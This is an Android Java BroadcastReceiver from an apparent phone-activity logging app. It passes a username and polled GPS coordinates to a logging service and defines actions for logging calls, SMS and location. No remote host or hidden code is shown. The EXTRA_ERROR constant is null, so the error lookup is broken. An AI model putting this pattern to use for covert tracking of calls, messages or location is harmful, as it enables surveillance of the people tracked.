package app.mtproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.Location;
import cwac.locpoll.LocationPoller;
import com.commonsware.cwac.wakeful.*;

public class LoggingReceiver extends BroadcastReceiver {
	public static final String ACTION_CALLS_LOGGING = "ACTION_CALLS_LOGGING";
	public static final String ACTION_SMS_LOGGING = "ACTION_SMS_LOGGING";
	public static final String ACTION_LOCATION_LOGGING = "ACTION_LOCATION_LOGGING";
	private static final String EXTRA_LOCATION = null;
	private static final String EXTRA_ERROR = null;

	@Override
	public void onReceive(Context context, Intent intent) {
		Intent startIntent = new Intent(context, LoggingService.class);
		
		String username = intent.getStringExtra("username");
		startIntent.putExtra("username", username);
		
		String action = intent.getStringExtra("serviceToStart");
		startIntent.putExtra("serviceToStart", action);
		
		Location loc=(Location)intent.getExtras().get(LocationPoller.EXTRA_LOCATION);
        String msg;

        if (loc==null) {
            msg=intent.getStringExtra(LoggingReceiver.EXTRA_ERROR);
        }
        else {
            msg=loc.toString();
            String latitude = String.valueOf((loc.getLatitude()));
        	String longitude = String.valueOf((loc.getLongitude()));
            startIntent.putExtra("latitude", latitude);
            startIntent.putExtra("longitude", longitude);
            String mierda = startIntent.getStringExtra("serviceToStart");
            if (mierda == null)
            {
            	startIntent.putExtra("serviceToStart", "dumpLocation");
            }
        }

        if (msg==null) {
            msg="Invalid broadcast received!";
        }
		
        LoggingService.sendWakefulWork(context, startIntent);
	}
}